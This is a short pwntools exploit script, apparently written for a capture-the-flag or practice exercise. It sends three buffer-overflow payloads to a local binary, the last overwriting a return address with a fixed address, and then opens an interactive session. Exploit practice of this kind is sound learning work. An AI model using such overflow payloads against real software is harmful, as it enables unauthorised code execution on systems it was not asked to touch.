from pwn import *

context.terminal = "kitty"
p = process("./a.out")
# p = gdb.debug("./a.out", gdbscript="b *returnFunction+42")

payload = flat(
    b'A' * 16,
    b'B' * 2
)

p.sendline(payload)

payload = flat(
    b'A' * 16,
    p32(0xdeadbeef),
)


p.sendline(payload)

payload = flat(
    b'A' * 28,
    p32(0x0804940d)
)

p.sendline(payload)


p.interactive()
